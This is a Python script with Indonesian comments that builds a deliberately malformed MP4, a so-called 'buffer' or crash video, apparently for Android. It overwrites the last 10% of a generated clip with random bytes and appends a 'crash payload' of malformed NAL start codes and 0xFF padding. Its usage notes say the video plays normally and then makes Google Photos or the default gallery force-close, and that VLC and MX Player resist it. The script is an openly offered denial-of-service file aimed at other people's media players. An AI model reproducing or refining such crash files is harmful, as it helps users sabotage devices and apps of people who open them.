#!/usr/bin/env python3
"""
BUFFER MAKER - CORRECTED VERSION
Video bisa diputar normal sampai 90%, baru crash di 10% akhir
"""

import os
import subprocess
import shutil
import random

# ============================================================
# KONFIGURASI
# ============================================================
OUTPUT_FOLDER = "buffered_videos"
NORMAL_VIDEO = "lv_0_20260503222753.mp4"
BUFFERED_NAME = "buffered_crash.mp4"
BUFFERED_PATH = os.path.join(OUTPUT_FOLDER, BUFFERED_NAME)

os.makedirs(OUTPUT_FOLDER, exist_ok=True)

print("\n" + "="*60)
print("   BUFFER MAKER - Video Crash di 10% AKHIR")
print("="*60)

# ============================================================
# STEP 1: BIKIN VIDEO NORMAL (8 detik, biar cepet test)
# ============================================================
print("\n[1] Membuat video normal 8 detik...")
subprocess.run([
    "ffmpeg", "-f", "lavfi", "-i",
    "testsrc=duration=8:size=640x480:rate=30",
    "-c:v", "libx264", "-preset", "ultrafast",
    "-movflags", "+faststart",
    "-y", NORMAL_VIDEO
], capture_output=True)

normal_size = os.path.getsize(NORMAL_VIDEO)
print(f"    ✓ Video normal: {normal_size:,} bytes")

# ============================================================
# STEP 2: BUFFER HANYA 10% AKHIR (BAGIAN DEPAN TETAP UTUH)
# ============================================================
print("\n[2] Membuat video buffer (corrupt 10% akhir)...")
shutil.copy2(NORMAL_VIDEO, BUFFERED_PATH)

with open(BUFFERED_PATH, "r+b") as f:
    f.seek(0, 2)
    total_size = f.tell()
    
    # HANYA corrupt 10% TERAKHIR (bukan dari awal!)
    corrupt_start = int(total_size * 0.90)  # mulai dari 90%
    print(f"    ✓ Mulai corrupt dari byte {corrupt_start:,} (90% dari file)")
    
    # Tulis garbage di 10% akhir
    f.seek(corrupt_start)
    garbage_len = total_size - corrupt_start
    garbage = bytes([random.randint(0, 255) for _ in range(garbage_len)])
    f.write(garbage)
    print(f"    ✓ {garbage_len:,} bytes garbage ditulis")
    
    # Cari moov di file ASLI sebelum corrupt? Jangan.
    # Biarkan moov tetap utuh di bagian depan
    
# ============================================================
# STEP 3: TAMBAHKAN CRASH PAYLOAD DI VERY END
# ============================================================
print("\n[3] Menambahkan crash payload di akhir...")
with open(BUFFERED_PATH, "a+b") as f:
    # Inject malformed NALU di akhir (biar crash pas mau baca)
    crash_payload = b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\xff" * 100000
    f.write(crash_payload)
    print(f"    ✓ Crash payload: {len(crash_payload):,} bytes")

# ============================================================
# STEP 4: VERIFIKASI
# ============================================================
final_size = os.path.getsize(BUFFERED_PATH)
print(f"\n[✓] VIDEO BUFFER SIAP!")
print(f"    Lokasi: {BUFFERED_PATH}")
print(f"    Size: {final_size:,} bytes")

# Test pake ffprobe (harusnya BISA baca durasi, karena moov utuh)
result = subprocess.run([
    "ffprobe", "-v", "error", "-show_entries", "format=duration",
    "-of", "default=noprint_wrappers=1:nokey=1", BUFFERED_PATH
], capture_output=True, text=True)

if result.stdout.strip():
    print(f"    ✓ Durasi terbaca: {result.stdout.strip()} detik (video valid)")
else:
    print(f"    ⚠ Video mungkin terlalu rusak: {result.stderr[:100]}")

# ============================================================
# STEP 5: COPY KE DOWNLOAD
# ============================================================
import shutil
download_path = f"/sdcard/Download/{BUFFERED_NAME}"
try:
    shutil.copy2(BUFFERED_PATH, download_path)
    print(f"\n[✓] File juga disalin ke: {download_path}")
except:
    print(f"\n[!] Gagal copy ke Download, ambil manual dari folder {OUTPUT_FOLDER}")

print("\n" + "="*60)
print("   CARA PAKAI:")
print("="*60)
print(f"""
1. Buka file manager → {OUTPUT_FOLDER}/ → {BUFFERED_NAME}
   ATAU
   Buka Download → {BUFFERED_NAME}

2. Putar video dengan GOOGLE PHOTOS atau GALLERY BAWAAN

3. Video akan:
   - 0-7 detik: JALAN NORMAL ✅
   - 7-8 detik: Glitch/artefak
   - 8 detik: PLAYER CRASH/FORCE CLOSE 💥

⚠️ JANGAN pake VLC atau MX Player (mereka kebal)
""")
